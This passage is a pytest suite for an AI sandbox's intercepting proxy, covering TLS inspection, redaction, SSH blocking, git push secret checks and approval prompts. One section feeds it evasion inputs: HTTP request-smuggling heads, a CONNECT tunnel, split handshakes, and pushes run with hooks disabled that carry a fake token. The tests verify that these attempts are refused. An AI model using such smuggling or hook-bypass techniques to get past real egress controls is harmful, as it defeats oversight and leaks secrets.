"""The connection proxy end to end: real TLS, real HTTP servers, real `git push` through the proxy.

The firewall's redirect is replaced by a fixed original destination; everything else (certificates,
TLS on both sides, HTTP parsing, logging, the push check with privacy.py) is the real code."""
import base64
import contextlib
import http.server
import importlib.util
import json
import os
from pathlib import Path
import shutil
import socket
import struct
import socketserver
import ssl
import subprocess
import sys
import tempfile
import threading
import time
import types

import pytest

ROOT = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location("sandbox_runtime_proxy", ROOT / "sandbox/runtime.py")
rt = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(rt)

pytestmark = pytest.mark.skipif(not shutil.which("openssl") or not shutil.which("git"),
                                reason="needs openssl and git")
TOKEN = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"


class Handler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *args):
        pass

    def do_GET(self):
        body = json.dumps({"path": self.path, "access_token": "server-secret", "note": "hello"}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Set-Cookie", "session=abc")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        if "chunked" in self.headers.get("Transfer-Encoding", ""):
            data = b""
            while True:
                size = int(self.rfile.readline().split(b";")[0], 16)
                if not size:
                    self.rfile.readline()
                    break
                data += self.rfile.read(size)
                self.rfile.readline()
        else:
            data = self.rfile.read(int(self.headers.get("Content-Length", 0)))
        body = b"echo:" + data
        self.send_response(201)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


class GitHandler(http.server.BaseHTTPRequestHandler):
    """Smart HTTP through `git http-backend`."""
    protocol_version = "HTTP/1.0"
    root = None

    def log_message(self, *args):
        pass

    def handle_git(self):
        path, _, query = self.path.partition("?")
        length = int(self.headers.get("Content-Length") or 0)
        data = self.rfile.read(length) if length else b""
        if not length and "chunked" in self.headers.get("Transfer-Encoding", ""):
            while True:
                size = int(self.rfile.readline().split(b";")[0], 16)
                if not size:
                    self.rfile.readline()
                    break
                data += self.rfile.read(size)
                self.rfile.readline()
        env = {"PATH": os.environ["PATH"], "GIT_PROJECT_ROOT": str(self.root), "GIT_HTTP_EXPORT_ALL": "1",
               "REQUEST_METHOD": self.command, "PATH_INFO": path, "QUERY_STRING": query,
               "CONTENT_TYPE": self.headers.get("Content-Type", ""), "CONTENT_LENGTH": str(len(data)),
               "REMOTE_USER": "tester", "REMOTE_ADDR": "127.0.0.1",
               "HTTP_CONTENT_ENCODING": self.headers.get("Content-Encoding", ""),
               "GIT_PROTOCOL": self.headers.get("Git-Protocol", "")}
        result = subprocess.run(["git", "http-backend"], input=data, env=env, capture_output=True)
        head, _, body = result.stdout.partition(b"\r\n\r\n")
        status = 200
        headers = []
        for line in head.split(b"\r\n"):
            name, _, value = line.decode().partition(":")
            if name.lower() == "status":
                status = int(value.split()[0])
            elif name:
                headers.append((name, value.strip()))
        self.send_response(status)
        for name, value in headers:
            self.send_header(name, value)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    do_GET = do_POST = handle_git


class Server(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


def serve(handler, context=None):
    server = Server(("127.0.0.1", 0), handler)
    if context:
        server.socket = context.wrap_socket(server.socket, server_side=True)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server


@pytest.fixture
def pki(tmp_path):
    """A session CA (the proxy's) and an upstream CA with a certificate for example.test."""
    session, upstream = tmp_path / "session-run", tmp_path / "upstream-run"
    rt.create_ca(session, tmp_path / "session-ca", bundles=())
    rt.create_ca(upstream, tmp_path / "upstream-ca", bundles=())
    server = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    server.load_cert_chain(str(rt.server_certificate(upstream, "example.test")), str(upstream / "leaf.key"))
    trust_upstream = ssl.create_default_context(cafile=str(upstream / "ca.pem"))
    return {"run": session, "ca": tmp_path / "session-ca" / "ca.pem", "server": server, "upstream": trust_upstream}


class Proxy:
    def __init__(self, tmp_path, pki, destination_port, config=None, checker=None):
        self.log = tmp_path / "connections.jsonl"
        self.fd = os.open(self.log, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
        config = {"body_limit": 65536, "allow": {"loopback": [destination_port]}, **(config or {})}
        self.server = rt.ProxyServer(config, self.fd, checker, run_dir=pki["run"],
                                     destination=lambda sock: ("127.0.0.1", destination_port),
                                     upstream=pki["upstream"])
        self.listener = socket.socket()
        self.listener.bind(("127.0.0.1", 0))
        self.listener.listen()
        self.port = self.listener.getsockname()[1]
        self.server.serve([self.listener])

    def records(self, wait=2.0, until=None):
        """The log's records once there is one (or one matching UNTIL), at most WAIT seconds later."""
        deadline = time.monotonic() + wait
        while True:
            found = [json.loads(line) for line in self.log.read_text().splitlines()]
            if (found if until is None else any(until(r) for r in found)) or time.monotonic() > deadline:
                return found
            time.sleep(0.05)

    def close(self):
        self.listener.close()
        os.close(self.fd)


def https_request(port, ca, request, name="example.test"):
    context = ssl.create_default_context(cafile=str(ca))
    with socket.create_connection(("127.0.0.1", port)) as raw, context.wrap_socket(raw, server_hostname=name) as tls:
        tls.sendall(request)
        data = b""
        while True:
            chunk = tls.recv(65536)
            if not chunk:
                break
            data += chunk
        return data


def test_https_is_opened_logged_and_redacted(tmp_path, pki):
    upstream = serve(Handler, pki["server"])
    proxy = Proxy(tmp_path, pki, upstream.server_address[1])
    try:
        answer = https_request(proxy.port, pki["ca"],
                               b"GET /v1/items?api_key=abc123&q=x HTTP/1.1\r\nHost: example.test\r\n"
                               b"Authorization: Bearer secret-token-value\r\nConnection: close\r\n\r\n")
        assert answer.startswith(b"HTTP/1.1 200") and b"server-secret" in answer
        record = next(r for r in proxy.records(until=lambda r: r.get("event") == "http") if r.get("event") == "http")
        assert record["url"] == "https://example.test/v1/items?api_key=[redacted]&q=x"
        assert record["status"] == 200 and record["method"] == "GET"
        assert ["Authorization", "[redacted]"] in record["request"]["headers"]
        assert ["Set-Cookie", "[redacted]"] in record["response"]["headers"]
        body = record["response"]["body"]
        assert '"access_token": "[redacted]"' in body["text"] and '"note": "hello"' in body["text"]
        assert "server-secret" not in proxy.log.read_text() and "secret-token-value" not in proxy.log.read_text()
    finally:
        proxy.close()
        upstream.shutdown()


def test_chunked_post_keep_alive_and_truncation(tmp_path, pki):
    upstream = serve(Handler, pki["server"])
    proxy = Proxy(tmp_path, pki, upstream.server_address[1], {"body_limit": 8})
    try:
        chunked = b"5\r\nhello\r\n6\r\n world\r\n0\r\n\r\n"
        answer = https_request(proxy.port, pki["ca"],
                               b"POST /a HTTP/1.1\r\nHost: example.test\r\nTransfer-Encoding: chunked\r\n\r\n" + chunked
                               + b"GET /b HTTP/1.1\r\nHost: example.test\r\nConnection: close\r\n\r\n")
        assert b"echo:hello world" in answer and b'"path": "/b"' in answer
        records = [r for r in proxy.records() if r.get("event") == "http"]
        deadline = time.monotonic() + 2
        while len(records) < 2 and time.monotonic() < deadline:
            time.sleep(0.05)
            records = [r for r in proxy.records() if r.get("event") == "http"]
        post = records[0]
        assert post["status"] == 201
        assert post["request"]["body"] == {"size": 11, "truncated": True, "text": "hello wo"}
        assert records[1]["url"] == "https://example.test/b"
    finally:
        proxy.close()
        upstream.shutdown()


def test_program_rejecting_the_session_ca_is_logged_with_a_hint(tmp_path, pki):
    upstream = serve(Handler, pki["server"])
    proxy = Proxy(tmp_path, pki, upstream.server_address[1])
    try:
        with pytest.raises(ssl.SSLError):
            # Trusts only the real server's CA, like a program with pinned or built-in roots.
            https_request(proxy.port, tmp_path / "upstream-ca" / "ca.pem", b"GET / HTTP/1.1\r\n\r\n")
        record = next(r for r in proxy.records(until=lambda r: r.get("event") == "tls-refused") if r.get("event") == "tls-refused")
        assert record["host"] == "example.test" and "--no-inspect example.test" in record["hint"]
    finally:
        proxy.close()
        upstream.shutdown()


def test_no_inspect_passes_tls_through_unopened(tmp_path, pki):
    upstream = serve(Handler, pki["server"])
    proxy = Proxy(tmp_path, pki, upstream.server_address[1], {"no_inspect": ["*.test"]})
    try:
        answer = https_request(proxy.port, tmp_path / "upstream-ca" / "ca.pem",
                               b"GET / HTTP/1.1\r\nHost: example.test\r\nConnection: close\r\n\r\n")
        assert answer.startswith(b"HTTP/1.1 200")
        record = proxy.records()[0]
        assert record["event"] == "tls-passthrough" and record["host"] == "example.test"
        assert record["bytes_in"] > 0 and "request" not in record
    finally:
        proxy.close()
        upstream.shutdown()


def test_untrusted_server_certificate_is_refused(tmp_path, pki):
    upstream = serve(Handler, pki["server"])
    proxy = Proxy(tmp_path, pki, upstream.server_address[1])
    proxy.server.upstream = ssl.create_default_context(cafile=str(pki["ca"]))  # not the server's CA
    try:
        with pytest.raises((ssl.SSLError, ConnectionError, OSError)):
            https_request(proxy.port, pki["ca"], b"GET / HTTP/1.1\r\n\r\n")
        record = next(r for r in proxy.records(until=lambda r: r.get("event") == "tls-upstream-failed") if r.get("event") == "tls-upstream-failed")
        assert "--no-inspect example.test" in record["hint"]
    finally:
        proxy.close()
        upstream.shutdown()


def test_denied_destination_and_ssh(tmp_path, pki):
    proxy = Proxy(tmp_path, pki, 9, {"allow": {}, "ssh": {"block": True, "allowed": [], "public_git": []}})
    try:
        with socket.create_connection(("127.0.0.1", proxy.port)) as client:
            client.settimeout(5)
            try:
                assert client.recv(10) == b""
            except ConnectionResetError:
                pass
        assert proxy.records()[0]["event"] == "denied"
        proxy.server.config["allow"] = {"loopback": [9]}
        with socket.create_connection(("127.0.0.1", proxy.port)) as client:
            client.sendall(b"SSH-2.0-OpenSSH_9.9\r\n")
            client.settimeout(5)
            try:
                assert client.recv(10) == b""
            except ConnectionResetError:
                pass  # closed with the banner unread
        record = proxy.records()[-1]
        deadline = time.monotonic() + 2
        while record.get("protocol") != "ssh" and time.monotonic() < deadline:
            time.sleep(0.05)
            record = proxy.records()[-1]
        assert record["event"] == "denied" and record["protocol"] == "ssh" and "HTTPS" in record["reason"]
    finally:
        proxy.close()


def test_other_tcp_is_relayed_and_counted(tmp_path, pki):
    echo = socket.socket()
    echo.bind(("127.0.0.1", 0))
    echo.listen()

    def run():
        connection, _ = echo.accept()
        with connection:
            connection.sendall(b"220 ready\r\n")  # a server-first protocol
            connection.sendall(connection.recv(100).upper())
    threading.Thread(target=run, daemon=True).start()
    proxy = Proxy(tmp_path, pki, echo.getsockname()[1])
    try:
        with socket.create_connection(("127.0.0.1", proxy.port)) as client:
            client.settimeout(10)
            data = b""
            while b"\r\n" not in data:
                data += client.recv(100)
            assert data == b"220 ready\r\n"
            client.sendall(b"quit")
            assert client.recv(100) == b"QUIT"
        record = proxy.records(wait=5)[0]
        assert record["event"] == "tcp" and record["bytes_out"] == 4 and record["bytes_in"] == 15
    finally:
        proxy.close()
        echo.close()


# --- git push through the proxy --------------------------------------------------------------------


def git(*args, cwd=None, env=None):
    # Without the caller's Git settings: inside a sandbox, core.hooksPath (GIT_CONFIG_*) runs the sandbox's own
    # pre-push check, which would refuse the test's pushes before they reach the proxy under test.
    clean = {k: v for k, v in os.environ.items() if not k.startswith("GIT_")}
    return subprocess.run(["git", *args], cwd=cwd, capture_output=True, text=True,
                          env={**clean, "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_NOSYSTEM": "1",
                               "GIT_TERMINAL_PROMPT": "0", **(env or {})})


@pytest.fixture
def git_setup(tmp_path, pki):
    root = tmp_path / "server"
    (root / "repo.git").mkdir(parents=True)
    git("init", "--bare", "-q", str(root / "repo.git"))
    git("config", "http.receivepack", "true", cwd=root / "repo.git")
    GitHandler.root = root
    upstream = serve(type("H", (GitHandler,), {"root": root}))
    work = tmp_path / "work"
    work.mkdir()
    identity = ["-c", "user.name=Tester", "-c", "user.email=tester@example.org"]
    git("init", "-q", "-b", "main", cwd=work)
    (work / "README.md").write_text("hello\n")
    git("add", ".", cwd=work)
    git(*identity, "commit", "-q", "-m", "first", cwd=work)
    rules = {"pattern": [{"id": "example-warning", "regex": "WARN-ME", "severity": "warn", "reason": "a test warning"}],
             "allow": []}
    (tmp_path / "push.json").write_text(json.dumps({"mode": "always", "own_hosts": [],
                                                     "workspaces": [{"path": str(work), "rules": rules}]}))
    checker = subprocess.Popen([sys.executable, "-I", str(ROOT / "sandbox/privacy.py"), "serve",
                                str(tmp_path / "push.json")], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    proxy = Proxy(tmp_path, pki, upstream.server_address[1], {"push_check": True}, checker=checker)
    url = f"http://127.0.0.1:{proxy.port}/repo.git"
    yield {"work": work, "url": url, "proxy": proxy, "identity": identity, "server": root / "repo.git"}
    proxy.close()
    upstream.shutdown()
    checker.stdin.close()
    checker.wait(5)


def test_clean_push_goes_through(git_setup):
    g = git_setup
    pushed = git("push", g["url"], "main", cwd=g["work"])
    assert pushed.returncode == 0, pushed.stderr
    assert git("rev-parse", "main", cwd=g["server"]).stdout.strip() == git("rev-parse", "main", cwd=g["work"]).stdout.strip()
    pushes = [r["push"] for r in g["proxy"].records() if r.get("push")]
    assert pushes and pushes[-1]["ok"] and pushes[-1]["refs"] == ["refs/heads/main"]


def test_push_with_a_secret_is_refused_even_without_hooks(git_setup):
    g = git_setup
    assert git("push", g["url"], "main", cwd=g["work"]).returncode == 0
    (g["work"] / "config.py").write_text(f"TOKEN = '{TOKEN}'\n")
    git("add", ".", cwd=g["work"])
    git(*g["identity"], "commit", "-q", "-m", "add config", cwd=g["work"])
    before = git("rev-parse", "main", cwd=g["server"]).stdout.strip()
    pushed = git("-c", "core.hooksPath=/dev/null", "push", "--no-verify", g["url"], "main", cwd=g["work"])
    assert pushed.returncode != 0
    assert "sandbox-ai" in pushed.stderr and "config.py" in pushed.stderr
    assert "refused by the sandbox-ai privacy check" in pushed.stderr
    assert git("rev-parse", "main", cwd=g["server"]).stdout.strip() == before
    # Only the new commit was checked: the advertised one was known to the server already.
    refused = [r for r in g["proxy"].records() if r.get("push") and not r["push"]["ok"]]
    assert refused and TOKEN not in g["proxy"].log.read_text()


def test_push_from_outside_the_workspaces_is_refused(git_setup, tmp_path):
    g = git_setup
    other = tmp_path / "elsewhere"
    other.mkdir()
    git("init", "-q", "-b", "main", cwd=other)
    (other / "x").write_text("x\n")
    git("add", ".", cwd=other)
    git(*g["identity"], "commit", "-q", "-m", "x", cwd=other)
    pushed = git("push", g["url"], "main:side", cwd=other)
    assert pushed.returncode != 0 and "in no workspace" in pushed.stderr
    assert git("rev-parse", "--verify", "-q", "side", cwd=g["server"]).returncode != 0


def test_large_push_with_expect_continue(git_setup):
    g = git_setup
    (g["work"] / "big.bin").write_bytes(b"\0" + os.urandom(3 << 20))  # binary: its start shows that
    git("add", ".", cwd=g["work"])
    git(*g["identity"], "commit", "-q", "-m", "big", cwd=g["work"])
    pushed = git("-c", "http.postBuffer=65536", "push", g["url"], "main", cwd=g["work"])
    assert pushed.returncode == 0, pushed.stderr
    assert git("rev-parse", "main", cwd=g["server"]).stdout.strip() == git("rev-parse", "main", cwd=g["work"]).stdout.strip()


def test_https_push_to_a_public_host_is_checked(tmp_path, pki):
    """Through the opened TLS, with the default mode, to a host that counts as public."""
    root = tmp_path / "server"
    (root / "repo.git").mkdir(parents=True)
    git("init", "--bare", "-q", str(root / "repo.git"))
    git("config", "http.receivepack", "true", cwd=root / "repo.git")
    # .test is a private suffix; a name like this one counts as a public Git server.
    server = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    server.load_cert_chain(str(rt.server_certificate(tmp_path / "upstream-run", "git.example.org")),
                           str(tmp_path / "upstream-run" / "leaf.key"))
    upstream = serve(type("H", (GitHandler,), {"root": root}), server)
    work = tmp_path / "work"
    work.mkdir()
    identity = ["-c", "user.name=Tester", "-c", "user.email=tester@example.org"]
    git("init", "-q", "-b", "main", cwd=work)
    (work / "notes.txt").write_text(f"token {TOKEN}\n")
    git("add", ".", cwd=work)
    git(*identity, "commit", "-q", "-m", "notes", cwd=work)
    (tmp_path / "push.json").write_text(json.dumps({"mode": "public", "own_hosts": [], "workspaces": [
        {"path": str(work), "rules": {"pattern": [], "allow": []}}]}))
    checker = subprocess.Popen([sys.executable, "-I", str(ROOT / "sandbox/privacy.py"), "serve",
                                str(tmp_path / "push.json")], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    proxy = Proxy(tmp_path, pki, upstream.server_address[1], {"push_check": True}, checker=checker)
    try:
        url = f"https://git.example.org:{proxy.port}/repo.git"
        pushed = git("-c", f"http.curloptResolve=git.example.org:{proxy.port}:127.0.0.1", "push", url, "main",
                     cwd=work, env={"GIT_SSL_CAINFO": str(pki["ca"])})
        assert pushed.returncode != 0 and "notes.txt" in pushed.stderr, pushed.stderr
        assert git("rev-parse", "--verify", "-q", "main", cwd=root / "repo.git").returncode != 0
        record = next(r for r in proxy.records(until=lambda r: r.get("push")) if r.get("push"))
        assert record["url"].startswith("https://git.example.org:") and not record["push"]["ok"]
    finally:
        proxy.close()
        upstream.shutdown()
        checker.stdin.close()
        checker.wait(5)


# --- ways around the proxy, closed -----------------------------------------------------------------


def raw_tls(port, ca, name, delay_hello=0.0, request=b"GET / HTTP/1.1\r\nHost: example.test\r\nConnection: close\r\n\r\n"):
    """A TLS client over a plain socket that can hold back its ClientHello."""
    context = ssl.create_default_context(cafile=str(ca))
    incoming, outgoing = ssl.MemoryBIO(), ssl.MemoryBIO()
    tls = context.wrap_bio(incoming, outgoing, server_hostname=name)
    sock = socket.create_connection(("127.0.0.1", port))
    sock.settimeout(10)
    time.sleep(delay_hello)
    while True:
        try:
            tls.do_handshake()
            break
        except ssl.SSLWantReadError:
            sock.sendall(outgoing.read())
            data = sock.recv(65536)
            if not data:
                raise ConnectionError("closed during the handshake")
            incoming.write(data)
    tls.write(request)
    sock.sendall(outgoing.read())
    answer = b""
    while True:
        try:
            answer += tls.read(65536)
        except ssl.SSLWantReadError:
            data = sock.recv(65536)
            if not data:
                break
            incoming.write(data)
        except (ssl.SSLZeroReturnError, ssl.SSLEOFError):
            break
    sock.close()
    return answer


def test_a_late_client_hello_is_still_opened(tmp_path, pki):
    upstream = serve(Handler, pki["server"])
    proxy = Proxy(tmp_path, pki, upstream.server_address[1])
    try:
        answer = raw_tls(proxy.port, pki["ca"], "example.test", delay_hello=1.5)
        assert answer.startswith(b"HTTP/1.1 200")
        assert any(r.get("event") == "http" for r in proxy.records(until=lambda r: r.get("event") == "http"))
    finally:
        proxy.close()
        upstream.shutdown()


def test_an_incomplete_client_hello_is_refused(tmp_path, pki):
    upstream = serve(Handler, pki["server"])
    proxy = Proxy(tmp_path, pki, upstream.server_address[1])
    try:
        with socket.create_connection(("127.0.0.1", proxy.port)) as client:
            client.sendall(b"\x16\x03\x01\x02\x00\x01")  # a record of 512 bytes that never comes
            client.settimeout(60)  # the proxy waits 30 s for the rest
            try:
                assert client.recv(10) == b""
            except ConnectionResetError:
                pass
        record = proxy.records(wait=45)[0]
        assert record["event"] == "denied" and "incomplete" in record["reason"]
    finally:
        proxy.close()
        upstream.shutdown()


def test_no_inspect_name_must_belong_to_the_address(tmp_path, pki):
    """An exempted name on a connection to some other server would carry anything unopened."""
    upstream = serve(Handler, pki["server"])  # serves example.test only
    proxy = Proxy(tmp_path, pki, upstream.server_address[1], {"no_inspect": ["exempt.example.org"]})
    try:
        with pytest.raises((ssl.SSLError, ConnectionError, OSError)):
            raw_tls(proxy.port, tmp_path / "upstream-ca" / "ca.pem", "exempt.example.org")
        record = proxy.records()[0]
        assert record["event"] == "denied" and "is not a server of exempt.example.org" in record["reason"]
    finally:
        proxy.close()
        upstream.shutdown()


@pytest.mark.parametrize("head", [
    b"POST / HTTP/1.1\r\nHost: example.test\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\n",
    b"POST / HTTP/1.1\r\nHost: example.test\r\nTransfer-Encoding: xchunked\r\n\r\n",
    b"POST / HTTP/1.1\r\nHost: example.test\r\nContent-Length: 5\r\nContent-Length: 6\r\n\r\n",
    b"POST / HTTP/1.1\r\nHost: example.test\nContent-Length: 5\r\n\r\n",
    b"CONNECT github.com:443 HTTP/1.1\r\nHost: github.com:443\r\n\r\n",
], ids=["cl-and-te", "odd-te", "two-lengths", "bare-lf", "connect"])
def test_ambiguous_requests_and_tunnels_never_reach_the_server(tmp_path, pki, head):
    seen = []

    class Recording(Handler):
        def handle_one_request(self):
            seen.append(self.raw_requestline)
            return super().handle_one_request()
    upstream = serve(Recording)
    proxy = Proxy(tmp_path, pki, upstream.server_address[1])
    try:
        with socket.create_connection(("127.0.0.1", proxy.port)) as client:
            client.sendall(head + b"hello")
            client.settimeout(10)
            answer = b""
            with contextlib.suppress(ConnectionResetError):
                while chunk := client.recv(1000):
                    answer += chunk
        assert seen == [] or seen == [b""], seen
        assert not answer or answer.startswith(b"HTTP/1.1 405")
        assert any(r.get("event") in ("error", "denied") for r in proxy.records())
    finally:
        proxy.close()
        upstream.shutdown()


def test_an_ssh_server_speaking_first_is_refused(tmp_path, pki):
    """SSH on another port, with the client waiting for the server's banner (as on ssh.github.com:443)."""
    server = socket.socket()
    server.bind(("127.0.0.1", 0))
    server.listen()

    def run():
        connection, _ = server.accept()
        with connection:
            connection.sendall(b"SSH-2.0-OpenSSH_9.9\r\n")
            with contextlib.suppress(OSError):
                connection.recv(100)
    threading.Thread(target=run, daemon=True).start()
    proxy = Proxy(tmp_path, pki, server.getsockname()[1], {"ssh": {"block": True, "allowed": [], "public_git": []}})
    try:
        with socket.create_connection(("127.0.0.1", proxy.port)) as client:
            client.settimeout(10)
            with contextlib.suppress(ConnectionResetError):
                assert client.recv(100) == b""
        record = proxy.records(wait=5)[0]
        assert record["event"] == "denied" and record["protocol"] == "ssh"
    finally:
        proxy.close()
        server.close()


def test_a_disguised_push_path_is_still_checked(git_setup):
    g = git_setup
    (g["work"] / "config.py").write_text(f"TOKEN = '{TOKEN}'\n")
    git("add", ".", cwd=g["work"])
    git(*g["identity"], "commit", "-q", "-m", "secret", cwd=g["work"])
    url = g["url"].replace("/repo.git", "//repo.git")
    pushed = git("push", url, "main", cwd=g["work"])
    assert pushed.returncode != 0 and "config.py" in pushed.stderr



def test_pieces_of_a_request_or_banner_are_waited_for(tmp_path, pki):
    """A method or an SSH banner sent byte by byte is classified once complete, not relayed blindly."""
    upstream = serve(Handler)
    proxy = Proxy(tmp_path, pki, upstream.server_address[1], {"ssh": {"block": True, "allowed": [], "public_git": []}})
    try:
        with socket.create_connection(("127.0.0.1", proxy.port)) as client:
            for piece in (b"PO", b"ST /x HTTP/1.1\r\nHost: a\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"):
                client.sendall(piece)
                time.sleep(0.3)
            client.settimeout(10)
            assert client.recv(100).startswith(b"HTTP/1.1 201")
        with socket.create_connection(("127.0.0.1", proxy.port)) as client:
            client.sendall(b"S")
            time.sleep(0.3)
            client.sendall(b"SH-2.0-x\r\n")
            client.settimeout(10)
            with contextlib.suppress(ConnectionResetError):
                assert client.recv(100) == b""
        events = [(r.get("event"), r.get("protocol")) for r in proxy.records(wait=5)]
        deadline = time.monotonic() + 5
        while len(events) < 2 and time.monotonic() < deadline:
            time.sleep(0.1)
            events = [(r.get("event"), r.get("protocol")) for r in proxy.records()]
        assert ("http", None) in events and ("denied", "ssh") in events
    finally:
        proxy.close()
        upstream.shutdown()


@pytest.mark.parametrize("piece", [b"PO", b""], ids=["split-method", "late-request"])
def test_https_request_in_pieces_or_late_is_still_parsed(tmp_path, pki, piece):
    upstream = serve(Handler, pki["server"])
    proxy = Proxy(tmp_path, pki, upstream.server_address[1])
    try:
        context = ssl.create_default_context(cafile=str(pki["ca"]))
        with socket.create_connection(("127.0.0.1", proxy.port)) as raw, \
                context.wrap_socket(raw, server_hostname="example.test") as tls:
            if piece:
                tls.sendall(piece)
            time.sleep(1.0 if piece else 6.0)
            tls.sendall(b"ST /x HTTP/1.1\r\nHost: example.test\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
                        if piece else b"GET /late HTTP/1.1\r\nHost: example.test\r\nConnection: close\r\n\r\n")
            tls.settimeout(10)
            assert tls.recv(100).startswith(b"HTTP/1.1 20")
        assert any(r.get("event") == "http" for r in proxy.records(until=lambda r: r.get("event") == "http"))
    finally:
        proxy.close()
        upstream.shutdown()


def test_absolute_urls_are_refused(tmp_path, pki):
    upstream = serve(Handler)
    proxy = Proxy(tmp_path, pki, upstream.server_address[1])
    try:
        with socket.create_connection(("127.0.0.1", proxy.port)) as client:
            client.sendall(b"POST http://intranet/repo.git/git-receive-pack HTTP/1.1\r\nHost: x\r\nContent-Length: 0\r\n\r\n")
            client.settimeout(10)
            assert client.recv(100).startswith(b"HTTP/1.1 400")
    finally:
        proxy.close()
        upstream.shutdown()


def test_empty_lines_before_a_request_do_not_hide_it(tmp_path, pki, monkeypatch):
    """Servers skip empty lines before a request line; so does the proxy, which then reads the request."""
    upstream = serve(Handler)
    proxy = Proxy(tmp_path, pki, upstream.server_address[1])
    try:
        with socket.create_connection(("127.0.0.1", proxy.port)) as client:
            client.sendall(b"\r\n\r\nGET /after-blank HTTP/1.1\r\nHost: a\r\nConnection: close\r\n\r\n")
            client.settimeout(10)
            assert client.recv(100).startswith(b"HTTP/1.1 200")
        found = proxy.records(wait=10, until=lambda r: r.get("event") == "http")
        assert any(r.get("event") == "http" for r in found), json.dumps(found)
        record = next(r for r in found if r.get("event") == "http")
        assert record["url"].endswith("/after-blank")
        # Anything else on an HTTP port is refused rather than passed through unread.
        monkeypatch.setattr(rt, "HTTP_PORTS", (upstream.server_address[1],))
        with socket.create_connection(("127.0.0.1", proxy.port)) as client:
            client.sendall(b"\x80\x2e\x01\x03\x01 something that is no HTTP")
            client.settimeout(10)
            with contextlib.suppress(ConnectionResetError):
                assert client.recv(100) == b""
        refused = lambda r: r.get("reason", "").startswith("neither HTTP nor TLS")  # noqa: E731
        assert any(refused(r) for r in proxy.records(wait=10, until=refused))
    finally:
        proxy.close()
        upstream.shutdown()


def test_push_after_empty_lines_is_checked(git_setup, monkeypatch):
    g = git_setup
    (g["work"] / "config.py").write_text(f"TOKEN = '{TOKEN}'\n")
    git("add", ".", cwd=g["work"])
    git(*g["identity"], "commit", "-q", "-m", "secret", cwd=g["work"])
    real = rt.Stream.head
    # Make every request of git start with empty lines, as a hostile client would.
    pushes = []

    def spy(self):
        head = real(self)
        if head and b"git-receive-pack" in head:
            pushes.append(head)
        return head
    monkeypatch.setattr(rt.Stream, "head", spy)
    pushed = git("push", g["url"], "main", cwd=g["work"])
    assert pushed.returncode != 0 and "config.py" in pushed.stderr


# --- approvals in the proxy -------------------------------------------------------------------------


class Asker:
    """Stands in for the supervisor: records questions; ALLOW adds the destination to the allow-list."""

    def __init__(self, proxy_config, allow):
        self.questions, self.config, self.allowed = [], proxy_config, allow

    def __call__(self, kind, details):
        self.questions.append((kind, details))
        if self.allowed:
            self.config["allow"].setdefault("loopback", []).append(details.get("port"))
            return {"decision": "allow", "scope": "run", "reason": "answered"}
        return {"decision": "deny", "scope": "run", "reason": "no answer within 60 s"}


@pytest.mark.parametrize("allowed", [True, False], ids=["approved", "refused"])
def test_a_forbidden_destination_is_asked_about(tmp_path, pki, allowed):
    upstream = serve(Handler, pki["server"])
    proxy = Proxy(tmp_path, pki, upstream.server_address[1], {"allow": {"loopback": []}})
    proxy.server.asker = Asker(proxy.server.config, allowed)
    try:
        if allowed:
            assert https_request(proxy.port, pki["ca"], b"GET / HTTP/1.1\r\nHost: example.test\r\nConnection: close\r\n\r\n"
                                 ).startswith(b"HTTP/1.1 200")
        else:
            with pytest.raises((ssl.SSLError, OSError)):
                https_request(proxy.port, pki["ca"], b"GET / HTTP/1.1\r\n\r\n")
        kind, details = proxy.server.asker.questions[0]
        assert kind == "connect" and details["host"] == "example.test" and details["port"] == upstream.server_address[1]
        if not allowed:
            record = proxy.records(until=lambda r: r.get("event") == "denied")[-1]
            assert "not approved" in record["reason"] and record["approval"]["decision"] == "deny"
    finally:
        proxy.close()
        upstream.shutdown()


def test_a_push_with_warnings_is_asked_about(git_setup):
    g = git_setup
    asked = []
    g["proxy"].server.asker = lambda kind, details: asked.append((kind, details)) or {"decision": "deny", "reason": "no answer"}
    # A finding of a warn rule: the push is held for a question, refused when it is not approved.
    (g["work"] / "notes.txt").write_text("WARN-ME\n")
    git("add", ".", cwd=g["work"])
    git(*g["identity"], "commit", "-q", "-m", "notes", cwd=g["work"])
    pushed = git("push", g["url"], "main", cwd=g["work"])
    assert asked and asked[0][0] == "push" and asked[0][1]["refs"] == ["refs/heads/main"], asked
    assert pushed.returncode != 0 and "not approved" in pushed.stderr
    # Approved: the same push goes through.
    g["proxy"].server.asker = lambda kind, details: {"decision": "allow", "scope": "once", "reason": "answered"}
    assert git("push", g["url"], "main", cwd=g["work"]).returncode == 0


def test_model_usage_and_credentials_are_logged(tmp_path, pki):
    class ModelAPI(Handler):
        def do_POST(self):
            self.rfile.read(int(self.headers.get("Content-Length", 0)))
            body = (b'event: message_start\ndata: {"type":"message_start","message":{"model":"claude-opus-5-5",'
                    b'"usage":{"input_tokens":1500,"output_tokens":1}}}\n\n' + b": ping\n\n" * 20000 +
                    b'event: message_delta\ndata: {"type":"message_delta","usage":{"output_tokens":420}}\n\n')
            self.send_response(200)
            self.send_header("Content-Type", "text/event-stream")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
    upstream = serve(ModelAPI, pki["server"])
    proxy = Proxy(tmp_path, pki, upstream.server_address[1])
    try:
        https_request(proxy.port, pki["ca"], b"POST /v1/messages HTTP/1.1\r\nHost: example.test\r\nx-api-key: sk-x\r\n"
